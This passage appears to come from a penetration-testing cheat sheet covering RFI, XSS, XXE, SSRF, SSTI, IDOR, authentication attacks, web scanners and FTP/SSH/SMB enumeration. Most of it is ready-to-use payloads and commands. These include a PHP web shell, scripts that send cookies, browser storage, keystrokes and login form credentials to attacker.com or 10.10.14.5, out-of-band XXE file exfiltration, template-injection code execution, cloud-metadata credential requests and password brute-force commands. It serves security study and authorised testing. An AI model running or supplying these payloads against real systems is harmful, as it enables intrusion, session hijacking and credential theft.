# Basic RFI (when allow_url_include=On in php.ini)
http://<IP>/index.php?page=http://attacker.com/shell.txt
http://<IP>/index.php?page=http://10.10.14.5/shell.php

# With null byte (older PHP)
http://<IP>/index.php?page=http://attacker.com/shell.txt%00

# SMB share (Windows targets)
http://<IP>/index.php?page=\\attacker.com\share\shell.php
http://<IP>/index.php?page=\\10.10.14.5\share\shell.php

# FTP protocol
http://<IP>/index.php?page=ftp://attacker.com/shell.txt
http://<IP>/index.php?page=ftp://10.10.14.5/shell.txt

# Setting up simple HTTP server for RFI
python3 -m http.server 80
php -S 0.0.0.0:80

# Shell content (shell.txt)
<?php system($_GET['cmd']); ?>
```

### 2.3.6 üéØ XSS (Cross-Site Scripting)

> üìñ¬†**Reference**:¬†[XSS Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)

**üß™ Basic Detection Payloads:**

```html
# Standard alert boxes
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

# Image tag with onerror
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=alert(document.domain)>

# SVG tags
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

# Body tag
<body onload=alert(1)>
<body onpageshow=alert(1)>

# Input tags
<input autofocus onfocus=alert(1)>
<input onfocus=alert(1) autofocus>

# Details tag
<details open ontoggle=alert(1)>
<details ontoggle=alert(1) open>

# Iframe
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>

# Plain text injection (in href, etc.)
javascript:alert(1)
javascript:alert(document.cookie)

# Markdown injection (if markdown is rendered)
[Click me](javascript:alert(1))
```

**üõ°Ô∏è Filter Bypass Techniques:**

```html
# Case manipulation
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT>alert(1)</sCrIpT>

# Without script tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# Without parentheses
<script>onerror=alert;throw 1</script>
<script>throw onerror=alert,1</script>
<script>import('data:text/javascript,alert(1)')</script>

# Without quotes
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>

# Without spaces
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

# Encoding techniques
<script>alert(/XSS/.source)</script>
<script>alert\u0028document.domain\u0029</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

# Alternative event handlers
<svg/onload=alert(1)//
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle="alert(1)">

# Using different JavaScript contexts
<a href="javascript:alert(1)">Click</a>
<form action="javascript:alert(1)"><input type=submit>
<isindex type=submit value=XSS>

# Breaking out of attributes
"><script>alert(1)</script>
'><script>alert(1)</script>
" onmouseover="alert(1)
' onmouseover='alert(1)

# Breaking out of script tags
</script><script>alert(1)</script>
</ScRiPt><ScRiPt>alert(1)</ScRiPt>

# Comment tricks
<!--><script>alert(1)</script>
<script><!--
alert(1)
--></script>

# Using backticks
<script>alert`1`</script>
<script>alert`document.domain`</script>
```

**üç™ Cookie Stealing Payloads:**

```html
# Basic cookie exfiltration with document.location
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<script>window.location='http://10.10.14.5/?c='+document.cookie</script>

# Using Image object
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
<script>var i=new Image();i.src='http://10.10.14.5/?c='+btoa(document.cookie)</script>

# Using fetch API
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<script>fetch('http://10.10.14.5/?c='+btoa(document.cookie))</script>

# Hidden image tag
<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
<img src=x onerror="this.src='http://10.10.14.5/?c='+btoa(document.cookie)">

# Using XMLHttpRequest
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','http://attacker.com/?c='+document.cookie);
xhr.send();
</script>

# Exfiltrate to Burp Collaborator
<script>document.location='http://BURP_COLLABORATOR.com/?c='+document.cookie</script>

# Set up listener to capture cookies
nc -lvnp 80
python3 -m http.server 80

# Session hijacking payload
<script>
var cookies = document.cookie;
window.location = 'http://10.10.14.5/?cookie=' + encodeURIComponent(cookies);
</script>

# Exfiltrate localStorage and sessionStorage
<script>
var data = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage)
};
fetch('http://10.10.14.5/', {
  method: 'POST',
  body: JSON.stringify(data)
});
</script>
```

**üéØ High-Risk Areas for XSS Testing:**

- Search functionality
- Contact/comment forms
- User profile fields (username, bio, about)
- URL parameters reflected in responses
- Error messages
- File upload filenames
- Referer headers reflected
- User-Agent reflected
- Any user input displayed back

**üîç DOM-Based XSS:**

```html
# Test with location.hash (fragment identifier)
http://<IP>/page.html#<script>alert(1)</script>
http://<IP>/page.html#<img src=x onerror=alert(1)>

# Test with location.search (query string)
http://<IP>/page.html?query=<script>alert(1)</script>

# Example vulnerable code (innerHTML sink)
<script>
document.getElementById('content').innerHTML = location.hash.slice(1);
</script>
# Payload: #<img src=x onerror=alert(1)>

# Example vulnerable code (eval sink)
<script>
eval(location.hash.slice(1));
</script>
# Payload: #alert(1)

# document.write sink
<script>
document.write(location.hash.slice(1));
</script>
# Payload: #<img src=x onerror=alert(1)>
```

**üíâ Advanced XSS Payloads:**

```html
# Keylogger
<script>
document.onkeypress = function(e) {
  fetch('http://10.10.14.5/?key=' + String.fromCharCode(e.which));
}
</script>

# Page defacement
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

# Redirect to phishing page
<script>window.location='http://evil.com/phishing.html'</script>

# BeEF hook
<script src="http://10.10.14.5:3000/hook.js"></script>

# Steal forms data
<script>
document.forms[0].onsubmit = function() {
  fetch('http://10.10.14.5/?data=' + 
    encodeURIComponent(JSON.stringify({
      username: this.username.value,
      password: this.password.value
    })));
}
</script>
```

### 2.3.7 ‚ö†Ô∏è Advanced Vulnerability Classes

|Vulnerability|Trigger Condition|Initial Test|Resources|
|---|---|---|---|
|**XXE (XML External Entity)**|XML processing endpoints|`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`|[XXE Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/)|
|**SSRF**|URL fetching functionality|`http://127.0.0.1:80`|[SSRF](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)|
|**Deserialization**|Serialized objects in cookies/data|Language-specific payloads|[Deserialization](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/)|
|**SSTI**|Template engines (Jinja2, Twig, etc.)|`{{7*7}}`¬†or¬†`${7*7}`|[SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)|
|**IDOR**|Direct object references in URLs|Change ID parameters sequentially|[IDOR](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/)|
|**CSRF**|State-changing actions without tokens|Remove/modify CSRF tokens|[CSRF](https://swisskyrepo.github.io/PayloadsAllTheThings/CSRF%20Injection/)|
|**API Abuse**|REST/GraphQL APIs|Test auth, rate limits, IDOR|[API Testing](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting)|

#### XXE (XML External Entity) Injection

```xml
# Basic XXE - File Read (Linux)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

# Basic XXE - File Read (Windows)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>

# XXE with parameter entity
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# Blind XXE - Out-of-Band exfiltration
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>
<data>&send;</data>

# xxe.dtd content (host this on attacker server):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;

# XXE to SSRF (port scanning)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]>
<data>&xxe;</data>

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">]>
<data>&xxe;</data>

# XXE in SOAP request
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>

# XXE via SVG upload
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text>&xxe;</text>
</svg>

# XXE in SVG with OOB
<!DOCTYPE svg [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>

# Testing various formats
# Try: XML, SOAP, SVG, DOCX (unzip and modify), XLSX, PPTX
```

#### SSRF (Server-Side Request Forgery)

```bash
# Basic SSRF tests - Localhost
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://0
http://127.1
http://2130706433  # Decimal notation
http://0x7f000001  # Hexadecimal
http://0177.0.0.1  # Octal

# Port scanning internal network
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://192.168.1.1:80
http://10.0.0.1:80

# Cloud metadata endpoints (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/

# Cloud metadata (Google Cloud)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Bypass filters - DNS tricks
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://spoofed.burpcollaborator.net

# Bypass using different protocols
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
sftp://127.0.0.1:22

# Bypass with redirects (open redirect)
http://trusted-site.com/redirect?url=http://169.254.169.254/

# Accessing internal services
http://localhost:3000/admin
http://127.0.0.1:8080/manager/html
http://127.0.0.1:6379  # Redis
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL

# URL encoding bypass
http://127.0.0.1 ‚Üí http://%31%32%37%2e%30%2e%30%2e%31
```

#### SSTI (Server-Side Template Injection)

```python
# Detection payloads (test all of these)
{{7*7}}          # Jinja2, Twig (result: 49)
${7*7}           # FreeMarker, Velocity (result: 49)
<%= 7*7 %>       # ERB (result: 49)
${{7*7}}         # Test combination
#{7*7}           # Thymeleaf (result: 49)
*{7*7}           # Test alternative
@(7*7)           # Razor
{7*7}            # Test simple

# Jinja2 (Python/Flask)
{{config}}
{{config.items()}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE in Jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Read files in Jinja2
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.getRuntime('Symfony\\Component\\Routing\\RequestContext').getBaseUrl()}}

# FreeMarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# Velocity (Java)
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>

# Thymeleaf (Java)
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::

# Smarty (PHP)
{system('id')}
{php}system('id');{/php}

# Tornado (Python)
{{os.popen('id').read()}}
```

#### IDOR (Insecure Direct Object References)

```bash
# Parameter manipulation in URLs
/user/profile?id=1  ‚Üí /user/profile?id=2
/api/document/123  ‚Üí /api/document/124
/api/user/1/data   ‚Üí /api/user/2/data
/download?file=invoice_user1.pdf  ‚Üí /download?file=invoice_user2.pdf

# Cookie manipulation
user_id=1  ‚Üí user_id=2
account=123  ‚Üí account=124

# JSON body manipulation
{"user_id": 1}  ‚Üí {"user_id": 2}

# Base64/encoded IDs
dXNlcjE=  (user1 in base64) ‚Üí dXNlcjI=  (user2)
echo "user1" | base64
echo "user2" | base64

# Testing with Burp Suite Intruder
# 1. Capture request
# 2. Send to Intruder
# 3. Mark parameter (e.g., id=1)
# 4. Use numbers 1-1000 as payload
# 5. Grep for admin, sensitive, success

# Automated IDOR testing with ffuf
ffuf -w <(seq 1 1000) -u "http://<IP>/api/user/FUZZ" -mc 200

# Grep for interesting responses
ffuf -w <(seq 1 1000) -u "http://<IP>/api/user/FUZZ" -mc 200 -mr "admin|root|password"

# Test different HTTP methods
GET /api/user/1
PUT /api/user/1
DELETE /api/user/1
PATCH /api/user/1

# Test with authenticated vs unauthenticated
# Sometimes IDOR exists only when authenticated
```

### 2.3.8 üîê Authentication & Authorization Testing

```bash
# Default credentials (test common ones first)
admin:admin
admin:password
admin:Password123
root:root
root:toor

# SQL injection authentication bypass
admin'--
admin' OR '1'='1
' OR '1'='1'--
" OR "1"="1"--
admin'/*
admin' or 1=1--
admin' or 1=1#
') or '1'='1--

# Password reset vulnerabilities

## 1. Token manipulation
POST /reset-password
token=abc123&email=victim@example.com
# Try: Change email to attacker@example.com while keeping token

## 2. Host header poisoning
POST /forgot-password
Host: attacker.com
# Reset link may point to attacker.com

## 3. Token leakage in Referer
# Check if reset token is leaked in Referer header

## 4. Weak token generation
# Test if tokens are predictable (timestamp, sequential)

# Session fixation
# 1. Get session ID before login
# 2. Login with credentials
# 3. Check if session ID changes
# If not ‚Üí session fixation vulnerability

# Session hijacking
# Steal session cookie via XSS or network sniffing
# Use stolen cookie in browser

# JWT token attacks

## 1. Check for weak secrets
# Use jwt_tool or hashcat
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

## 2. Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

## 3. None algorithm attack
python3 jwt_tool.py <JWT_TOKEN> -X a

## 4. Decode and analyze
# Visit jwt.io and paste token
# Look for: user roles, expiration, issuer

## 5. Modify claims
python3 jwt_tool.py <JWT_TOKEN> -T

# Cookie manipulation
## Decode base64 cookies
echo "dXNlcjE=" | base64 -d

## Modify and re-encode
echo -n "admin" | base64

## Look for: role, user_id, is_admin, permissions

# Example vulnerable cookie
user_id=1&role=user&is_admin=false
# Modify to:
user_id=1&role=admin&is_admin=true

# OAuth vulnerabilities
## 1. Open redirect in redirect_uri
redirect_uri=http://attacker.com

## 2. CSRF in OAuth flow
# Remove state parameter

## 3. Token leakage
# Check for tokens in Referer, logs

# Two-factor authentication bypass
## 1. Try direct access after username/password
## 2. Test rate limiting on 2FA codes
## 3. Test if backup codes are weak

# Password brute force (use with caution)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Username enumeration
## Look for different responses:
## - "Invalid username"  vs "Invalid password"
## - Different response times
## - Different response lengths
```

---

## 2.4 Automated Scanning (Support Role)

> ‚ö†Ô∏è¬†**Important**: Automated scanners should support manual testing, not replace it. Always verify findings manually.

### 2.4.1 üõ†Ô∏è Nikto - Web Misconfiguration Scanner

```bash
# Basic scan
nikto -h http://<IP>
nikto -h http://<IP> -o nikto_<IP>.html -Format html
nikto -h http://<IP> -o nikto_<IP>.txt -Format txt

# Specific port scan
nikto -h http://<IP>:8080
nikto -h http://<IP>:8080 -o nikto_8080.html -Format html

# SSL/TLS scan
nikto -h https://<IP> -ssl
nikto -h https://<IP>:443 -ssl -o nikto_ssl.html -Format html

# Tuning options (specific test categories)
nikto -h http://<IP> -Tuning x  # All tests
nikto -h http://<IP> -Tuning 1  # Interesting files
nikto -h http://<IP> -Tuning 2  # Misconfiguration
nikto -h http://<IP> -Tuning 3  # Information disclosure
nikto -h http://<IP> -Tuning 4  # Injection (XSS/Script/HTML)
nikto -h http://<IP> -Tuning 5  # Remote file retrieval
nikto -h http://<IP> -Tuning 6  # Denial of service
nikto -h http://<IP> -Tuning 7  # Remote file retrieval (server wide)
nikto -h http://<IP> -Tuning 8  # Command execution / RFI
nikto -h http://<IP> -Tuning 9  # SQL injection
nikto -h http://<IP> -Tuning 0  # File upload
nikto -h http://<IP> -Tuning a  # Authentication bypass
nikto -h http://<IP> -Tuning b  # Software identification
nikto -h http://<IP> -Tuning c  # Remote source inclusion

# Multiple tuning options
nikto -h http://<IP> -Tuning 1b3

# With authentication (basic auth)
nikto -h http://<IP> -id admin:password

# With cookie authentication
nikto -h http://<IP> -cookie "PHPSESSID=abc123; security=low"

# Scan multiple hosts from file
nikto -h hosts.txt -o results.html -Format html

# Increase timeout
nikto -h http://<IP> -timeout 10

# Use proxy (through Burp)
nikto -h http://<IP> -useproxy http://127.0.0.1:8080

# Verbose output
nikto -h http://<IP> -Display V

# Save results in multiple formats
nikto -h http://<IP> -o report -Format htm,txt,csv
```

**üìä What to Look For in Nikto Results:**

- ‚úÖ Outdated server/application versions with known CVEs
- ‚úÖ Directory indexing enabled
- ‚úÖ Dangerous files exposed (`/phpinfo.php`,¬†`/test.php`,¬†`/backup/`,¬†`/admin/`)
- ‚úÖ Security headers missing (X-Frame-Options, CSP, HSTS, X-XSS-Protection)
- ‚úÖ Default/sample files present
- ‚úÖ Sensitive information disclosure
- ‚úÖ Allowed HTTP methods (PUT, DELETE, TRACE)
- ‚úÖ Potentially vulnerable CGI scripts

### 2.4.2 üéØ Nuclei - Template-Based Vulnerability Scanning

**Installation:**

```bash
# Go installation
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Or download binary
wget https://github.com/projectdiscovery/nuclei/releases/download/v3.0.0/nuclei_3.0.0_linux_amd64.zip
unzip nuclei_3.0.0_linux_amd64.zip
chmod +x nuclei
sudo mv nuclei /usr/local/bin/

# Update templates (do this regularly)
nuclei -update-templates
nuclei -ut
```

**Usage:**

```bash
# Basic scan with all templates
nuclei -u http://<IP>/ -o nuclei_<IP>.txt

# Critical/High severity only
nuclei -u http://<IP>/ -severity critical,high -o nuclei_high.txt
nuclei -u http://<IP>/ -s critical,high,medium -o nuclei_medium_plus.txt

# Specific technology templates
nuclei -u http://<IP>/ -tags wordpress -o nuclei_wordpress.txt
nuclei -u http://<IP>/ -tags apache,nginx,iis -o nuclei_webservers.txt
nuclei -u http://<IP>/ -tags php,python,java -o nuclei_languages.txt
nuclei -u http://<IP>/ -tags joomla,drupal,wordpress -o nuclei_cms.txt

# CVE scanning
nuclei -u http://<IP>/ -tags cve -o nuclei_cves.txt
nuclei -u http://<IP>/ -tags cve2023,cve2024 -o nuclei_recent_cves.txt

# Specific vulnerability types
nuclei -u http://<IP>/ -tags sqli,xss,lfi,rce -o nuclei_injection.txt
nuclei -u http://<IP>/ -tags rce,ssrf,xxe,ssti -o nuclei_critical_vulns.txt
nuclei -u http://<IP>/ -tags config,exposure,misconfig -o nuclei_misconfig.txt

# Scan multiple URLs from file
nuclei -l urls.txt -o nuclei_results.txt
nuclei -l targets.txt -severity critical,high -o nuclei_high_all.txt

# With rate limiting (avoid detection/blocking)
nuclei -u http://<IP>/ -rate-limit 150 -bulk-size 50
nuclei -u http://<IP>/ -rl 100 -bs 25 -c 10

# Exclude specific templates or tags
nuclei -u http://<IP>/ -etags dos,fuzz,fuzzing
nuclei -u http://<IP>/ -exclude-templates nuclei-templates/dos/

# Verbose output with matched template info
nuclei -u http://<IP>/ -v
nuclei -u http://<IP>/ -vv  # Very verbose

# Silent mode (only results)
nuclei -u http://<IP>/ -silent

# JSON output for parsing
nuclei -u http://<IP>/ -json -o nuclei_results.json

# Markdown report
nuclei -u http://<IP>/ -markdown-export nuclei_report.md

# With proxy (through Burp)
nuclei -u http://<IP>/ -proxy http://127.0.0.1:8080

# Scan with custom headers
nuclei -u http://<IP>/ -H "Cookie: PHPSESSID=abc123"
nuclei -u http://<IP>/ -H "Authorization: Bearer token123"

# List all templates
nuclei -tl
nuclei -tags -list

# Update and run specific workflow
nuclei -u http://<IP>/ -w workflows/wordpress-workflow.yaml

# Combination of filters
nuclei -u http://<IP>/ \
  -tags cve,rce,sqli \
  -severity critical,high \
  -exclude-severity info \
  -rate-limit 100 \
  -timeout 10 \
  -retries 2 \
  -o nuclei_filtered.txt
```

**üìù Template Categories:**

```
cve          - CVE checks
exposed      - Exposed panels/services
misconfiguration - Configuration issues
technologies - Technology detection
vulnerabilities - Known vulnerabilities
default-logins - Default credentials
takeovers    - Subdomain takeovers
iot          - IoT device vulnerabilities
network      - Network service checks
```

> üîç¬†**Pro Tip**: Always manually validate Nuclei findings. False positives are common. Use Nuclei to identify potential issues, then verify manually.

### 2.4.3 ü¶Ö WPScan - WordPress Vulnerability Scanner

```bash
# Basic enumeration
wpscan --url http://<IP>/
wpscan --url http://<IP>/wordpress/

# Enumerate users, plugins, themes
wpscan --url http://<IP>/ --enumerate u
wpscan --url http://<IP>/ --enumerate p
wpscan --url http://<IP>/ --enumerate t
wpscan --url http://<IP>/ --enumerate u,p,t

# Aggressive enumeration (all plugins and themes)
wpscan --url http://<IP>/ --enumerate ap
wpscan --url http://<IP>/ --enumerate at
wpscan --url http://<IP>/ --enumerate ap,at,u

# With API token (for vulnerability data - get free token from wpscan.com)
wpscan --url http://<IP>/ --api-token YOUR_TOKEN --enumerate vp,vt,u
wpscan --url http://<IP>/ --api-token YOUR_TOKEN --enumerate ap,at,u

# Enumerate vulnerable plugins/themes
wpscan --url http://<IP>/ --enumerate vp  # Vulnerable plugins
wpscan --url http://<IP>/ --enumerate vt  # Vulnerable themes

# Config backups and DB exports
wpscan --url http://<IP>/ --enumerate cb,dbe

# Full aggressive scan
wpscan --url http://<IP>/ --enumerate ap,at,cb,dbe,u --api-token YOUR_TOKEN

# Password brute force (use carefully - may lock accounts)
wpscan --url http://<IP>/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
wpscan --url http://<IP>/ --passwords passwords.txt --usernames users.txt
wpscan --url http://<IP>/ -P /usr/share/wordlists/fasttrack.txt -U admin,administrator

# XML-RPC brute force (faster but may be disabled)
wpscan --url http://<IP>/ --password-attack xmlrpc -U admin -P passwords.txt

# HTTP authentication
wpscan --url http://<IP>/ --basic-auth username:password

# Through proxy
wpscan --url http://<IP>/ --proxy http://127.0.0.1:8080

# Disable TLS verification
wpscan --url https://<IP>/ --disable-tls-checks

# Output to file
wpscan --url http://<IP>/ -o wpscan_output.txt
wpscan --url http://<IP>/ --format json -o wpscan.json

# Enumerate timthumbs
wpscan --url http://<IP>/ --enumerate tt

# Enumerate media IDs
wpscan --url http://<IP>/ --enumerate m

# Cookie-based authentication
wpscan --url http://<IP>/ --cookie-string "wordpress_logged_in_abc123=value"

# Custom user agent
wpscan --url http://<IP>/ --user-agent "Mozilla/5.0"

# Enumerate with threads
wpscan --url http://<IP>/ --enumerate u --max-threads 50

# Detection modes
wpscan --url http://<IP>/ --detection-mode mixed
wpscan --url http://<IP>/ --detection-mode passive
wpscan --url http://<IP>/ --detection-mode aggressive
```

**Flags Quick Reference:**

```
-e, --enumerate [OPTS]  Enumeration options
    u   = Users
    p   = Plugins
    t   = Themes
    ap  = All plugins
    at  = All themes
    vp  = Vulnerable plugins
    vt  = Vulnerable themes
    cb  = Config backups
    dbe = Database exports
    m   = Media IDs
    tt  = Timthumbs
```

---

## 2.5 Service-Specific Vulnerability Checks

### 2.5.1 üìÅ FTP Service (Port 21)

```bash
# Anonymous access test
ftp <IP>
# Username: anonymous
# Password: anonymous (or any email)

# Check upload/download permissions
ftp> binary
ftp> put test.txt
ftp> ls
ftp> get test.txt
ftp> delete test.txt

# Check if you can access other directories
ftp> cd ..
ftp> cd /
ftp> ls -la

# Nmap NSE scripts (comprehensive FTP testing)
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 <IP>

# Individual script testing
nmap --script ftp-anon -p 21 <IP>
nmap --script ftp-brute -p 21 <IP> --script-args userdb=users.txt,passdb=passwords.txt

# Download all files recursively (if anonymous access)
wget -r ftp://anonymous:anonymous@<IP>/
wget -m ftp://anonymous:anonymous@<IP>/  # Mirror

# Using lftp (more features)
lftp <IP>
lftp> user anonymous anonymous
lftp> ls
lftp> mirror  # Download entire directory
lftp> exit

# Check FTP bounce attack
nmap -b anonymous:anonymous@<IP> <target_ip>

# Brute force FTP (use carefully)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

**Common FTP Vulnerabilities to Check:**

- ‚úÖ Anonymous login enabled (read/write access)
- ‚úÖ Writable web root directories (potential upload location)
- ‚úÖ Default/weak credentials
- ‚úÖ ProFTPD 1.3.3c backdoor (CVE-2010-4221)
- ‚úÖ vsftpd 2.3.4 backdoor (CVE-2011-2523)
- ‚úÖ FTP bounce attack capability
- ‚úÖ Unencrypted transmission (credentials in clear text)

### 2.5.2 üîí SSH Service (Port 22)

```bash
# Banner grabbing
nc -nv <IP> 22
telnet <IP> 22
echo "EXIT" | nc <IP> 22

# SSH version detection
ssh -V <IP>

# Check supported authentication methods
ssh -v <IP> 2>&1 | grep "Authentications that can continue"

# Check for weak algorithms and ciphers
nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <IP> -p 22
nmap --script ssh-auth-methods --script-args="ssh.user=root" <IP> -p 22

# Comprehensive SSH audit
ssh-audit <IP>
ssh-audit <IP> -p 22

# SSH user enumeration (CVE-2018-15473) - timing attack
python3 ssh_user_enum.py --port 22 --userList users.txt <IP>

# Try common usernames
ssh root@<IP>
ssh admin@<IP>
ssh user@<IP>

# Private key authentication
ssh -i id_rsa user@<IP>

# Brute force (use carefully - may lock accounts)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# NetExec SSH
netexec ssh <IP> -u admin -p password
netexec ssh <IP> -u users.txt -p passwords.txt

# Check for known vulnerabilities
nmap --script ssh-* <IP> -p 22
searchsploit openssh <version>
```

**Common SSH Vulnerabilities to Check:**

- ‚úÖ Weak ciphers and algorithms (3DES, MD5, SHA1)
- ‚úÖ Password authentication enabled (instead of key-only)
- ‚úÖ Root login permitted
- ‚úÖ Default/weak credentials
- ‚úÖ User enumeration (CVE-2018-15473)
- ‚úÖ Outdated OpenSSH version with known CVEs
- ‚úÖ No rate limiting on authentication attempts

### 2.5.3 üíº SMB/NetBIOS Services (Ports 139, 445)

```bash
# List shares (null session)
smbclient -L //<IP> -N
smbclient -L \\\\<IP>\\ -N
smbclient -L //<IP> -U ""

# List shares (with credentials)
smbclient -L //<IP> -U username
smbclient -L //<IP> -U username%password

# Connect to specific share
smbclient //<IP>/sharename -N
smbclient //<IP>/sharename -U username%password

# SMB commands once connected
smb> ls
smb> cd directory
smb> get file.txt
smb> put file.txt
smb> mget *  # Download all files
smb> prompt off  # Disable prompts for mget
smb> recurse on  # Enable recursive downloads
smb> mget *

# Enumerate shares with smbmap
smbmap -H <IP>
smbmap -H <IP> -u guest -p ''
smbmap -H <IP> -u admin -p password
smbmap -H <IP> -u username -p password -r  # Recursive listing

# List all files recursively
smbmap -H <IP> -R
smbmap -H <IP> -u admin -p password -R

# Download specific file
smbmap -H <IP> --download 'share\file.txt'

# Upload file
smbmap -H <IP> --upload '/local/file.txt' 'share\file.txt'

# Execute command (if admin)
smbmap -H <IP> -u admin -p password -x 'whoami'

# enum4linux - Comprehensive SMB enumeration
enum4linux -a <IP>
enum4linux -U <IP>  # Users
enum4linux -S <IP>  # Shares
enum4linux -G <IP>  # Groups
enum4linux -P <IP>  # Password policy
enum4linux -o <IP>  # OS information
enum4linux -A <IP>  # All enumeration

# NetExec (formerly CrackMapExec) - Modern SMB toolkit
netexec smb <IP>
netexec smb <IP> -u '' -p ''  # Null session
netexec smb <IP> -u guest -p ''  # Guest access
netexec smb <IP> -u admin -p password
netexec smb <IP> -u users.txt -p passwords.txt
netexec smb <IP> -u admin -p password --shares
netexec smb <IP> -u admin -p password --disks
netexec smb <IP> -u admin -p password --sessions
